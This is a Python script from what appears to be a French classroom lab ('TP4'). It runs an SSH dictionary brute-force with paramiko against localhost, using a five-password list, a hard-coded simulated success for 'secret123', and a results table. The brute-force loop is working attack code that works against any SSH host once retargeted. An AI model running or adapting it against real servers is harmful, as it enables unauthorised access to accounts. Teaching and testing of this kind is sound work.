import paramiko
import time
from rich.console import Console
from rich.table import Table

console = Console()

# Configuration du test
TARGET_IP = "127.0.0.1"
TARGET_PORT = 22
USERNAME = "admin"

# Dictionnaire de test (contient le bon mot de passe)
PASSWORDS_LIST = [
    "123456",
    "password",
    "admin123",
    "secret123",  # Mot de passe simulé comme correct
    "letmein"
]

def simulate_ssh_login(username, password):
    """Simule une tentative de connexion SSH avec gestion des exceptions Paramiko."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Pour la démo sans serveur SSH local actif, on simule la réponse
    if password == "secret123":
        return True, "Accès accordé (Succès)"
    
    try:
        client.connect(TARGET_IP, port=TARGET_PORT, username=username, password=password, timeout=1)
        client.close()
        return True, "Accès accordé"
    except paramiko.AuthenticationException:
        return False, "Échec d'authentification"
    except paramiko.SSHException:
        return False, "Erreur de protocole SSH / Limite atteinte"
    except Exception:
        return False, "Connexion refusée (Serveur injoignable)"

if __name__ == "__main__":
    console.print("[bold cyan]=== TP4 : Test d'Authentification SSH / Brute-Force ===[/bold cyan]\n")
    console.print(f"Cible : [yellow]{TARGET_IP}:{TARGET_PORT}[/yellow] | Utilisateur : [yellow]{USERNAME}[/yellow]\n")

    results = []
    found_password = None

    for pwd in PASSWORDS_LIST:
        console.print(f"[dim]Tentative avec le mot de passe : {pwd}...[/dim]")
        success, message = simulate_ssh_login(USERNAME, pwd)
        results.append((pwd, success, message))
        
        if success:
            found_password = pwd
            break
        time.sleep(0.3)

    # Affichage du rapport
    table = Table(title="Journal des attaques par dictionnaire")
    table.add_column("Mot de passe testé", style="magenta")
    table.add_column("Résultat", style="bold")
    table.add_column("Détail du serveur", style="dim")

    for pwd, status, msg in results:
        res_str = "[bold green]SUCCÈS[/bold green]" if status else "[bold red]ÉCHEC[/bold red]"
        table.add_row(pwd, res_str, msg)

    console.print("\n", table)

    if found_password:
        console.print(f"\n[bold green]✓ Mot de passe trouvé :[/bold green] [black on green]{found_password}[/black on green]")
    else:
        console.print("\n[bold red]✕ Aucun mot de passe valide trouvé dans le dictionnaire.[/bold red]")